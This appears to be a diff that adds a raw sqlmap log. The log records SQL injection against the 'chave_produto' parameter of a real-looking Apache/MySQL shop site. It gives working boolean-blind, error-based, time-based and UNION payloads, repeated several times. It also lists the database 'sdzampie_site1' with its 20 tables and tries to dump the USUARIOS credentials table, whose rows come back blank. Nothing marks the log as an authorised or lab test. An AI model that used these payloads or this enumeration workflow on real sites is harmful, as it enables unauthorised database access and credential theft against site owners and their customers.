@@ -1,0 +1,245 @@
+sqlmap identified the following injection point(s) with a total of 68 HTTP(s) requests:
+---
+Parameter: chave_produto (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 AND 4208=4208
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 OR (SELECT 8970 FROM(SELECT COUNT(*),CONCAT(0x7170786b71,(SELECT (ELT(8970=8970,1))),0x716a627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 UNION ALL SELECT CONCAT(0x7170786b71,0x706d72777859706967454b526d534e76674b4678704c7368685041745273704a507a7662627a7464,0x716a627871),NULL,NULL,NULL,NULL,NULL,NULL-- BnQp
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: chave_produto (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 AND 4208=4208
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 OR (SELECT 8970 FROM(SELECT COUNT(*),CONCAT(0x7170786b71,(SELECT (ELT(8970=8970,1))),0x716a627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 UNION ALL SELECT CONCAT(0x7170786b71,0x706d72777859706967454b526d534e76674b4678704c7368685041745273704a507a7662627a7464,0x716a627871),NULL,NULL,NULL,NULL,NULL,NULL-- BnQp
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+Database: sdzampie_site1
+[20 tables]
++----------------------+
+| BANNER               |
+| CLIENTES             |
+| CLIENTES_ENDERECOS   |
+| DADOSEMPRESA         |
+| ENDERECO_ALTERNATIVO |
+| ITENS_VENDA          |
+| LISTAS               |
+| MENUS                |
+| MENU_ITENS           |
+| PRODUTOS             |
+| PRODUTOS_IMAGENS     |
+| SEQUENCIAS           |
+| TEXTOS_EMPRESA       |
+| USUARIOS             |
+| USUARIO_PERFIL       |
+| VENDAS               |
+| VENDAS_ITENS         |
+| VIEW_CLIENTES        |
+| VIEW_ITENSVENDAS     |
+| VIEW_VENDAS          |
++----------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: chave_produto (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 AND 4208=4208
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 OR (SELECT 8970 FROM(SELECT COUNT(*),CONCAT(0x7170786b71,(SELECT (ELT(8970=8970,1))),0x716a627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 UNION ALL SELECT CONCAT(0x7170786b71,0x706d72777859706967454b526d534e76674b4678704c7368685041745273704a507a7662627a7464,0x716a627871),NULL,NULL,NULL,NULL,NULL,NULL-- BnQp
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+Database: sdzampie_site1
+[20 tables]
++----------------------+
+| BANNER               |
+| CLIENTES             |
+| CLIENTES_ENDERECOS   |
+| DADOSEMPRESA         |
+| ENDERECO_ALTERNATIVO |
+| ITENS_VENDA          |
+| LISTAS               |
+| MENUS                |
+| MENU_ITENS           |
+| PRODUTOS             |
+| PRODUTOS_IMAGENS     |
+| SEQUENCIAS           |
+| TEXTOS_EMPRESA       |
+| USUARIOS             |
+| USUARIO_PERFIL       |
+| VENDAS               |
+| VENDAS_ITENS         |
+| VIEW_CLIENTES        |
+| VIEW_ITENSVENDAS     |
+| VIEW_VENDAS          |
++----------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: chave_produto (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 AND 4208=4208
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 OR (SELECT 8970 FROM(SELECT COUNT(*),CONCAT(0x7170786b71,(SELECT (ELT(8970=8970,1))),0x716a627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 UNION ALL SELECT CONCAT(0x7170786b71,0x706d72777859706967454b526d534e76674b4678704c7368685041745273704a507a7662627a7464,0x716a627871),NULL,NULL,NULL,NULL,NULL,NULL-- BnQp
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+Database: sdzampie_site1
+Table: USUARIOS
+[4 entries]
++---------+---------+---------+---------------+---------------+
+| NOME    | SENHA   | LOGIN   | CHAVE_USUARIO | ADMINISTRADOR |
++---------+---------+---------+---------------+---------------+
+| <blank> | <blank> | <blank> | <blank>       | <blank>       |
+| <blank> | <blank> | <blank> | <blank>       | <blank>       |
+| <blank> | <blank> | <blank> | <blank>       | <blank>       |
+| <blank> | <blank> | <blank> | <blank>       | <blank>       |
++---------+---------+---------+---------------+---------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: chave_produto (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 AND 4208=4208
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 OR (SELECT 8970 FROM(SELECT COUNT(*),CONCAT(0x7170786b71,(SELECT (ELT(8970=8970,1))),0x716a627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 UNION ALL SELECT CONCAT(0x7170786b71,0x706d72777859706967454b526d534e76674b4678704c7368685041745273704a507a7662627a7464,0x716a627871),NULL,NULL,NULL,NULL,NULL,NULL-- BnQp
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: chave_produto (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 AND 4208=4208
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 OR (SELECT 8970 FROM(SELECT COUNT(*),CONCAT(0x7170786b71,(SELECT (ELT(8970=8970,1))),0x716a627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 UNION ALL SELECT CONCAT(0x7170786b71,0x706d72777859706967454b526d534e76674b4678704c7368685041745273704a507a7662627a7464,0x716a627871),NULL,NULL,NULL,NULL,NULL,NULL-- BnQp
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+select * USUARIOS [1]:
+
+select count(*) from USUARIOS [1]:
+
+select count(*) from SEQUENCIAS [1]:
+
+select count(*) from ITENS_VENDA [1]:
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: chave_produto (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 AND 4208=4208
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 OR (SELECT 8970 FROM(SELECT COUNT(*),CONCAT(0x7170786b71,(SELECT (ELT(8970=8970,1))),0x716a627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: pagina=produtos&acao=detalhar&chave_produto=6 UNION ALL SELECT CONCAT(0x7170786b71,0x706d72777859706967454b526d534e76674b4678704c7368685041745273704a507a7662627a7464,0x716a627871),NULL,NULL,NULL,NULL,NULL,NULL-- BnQp
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
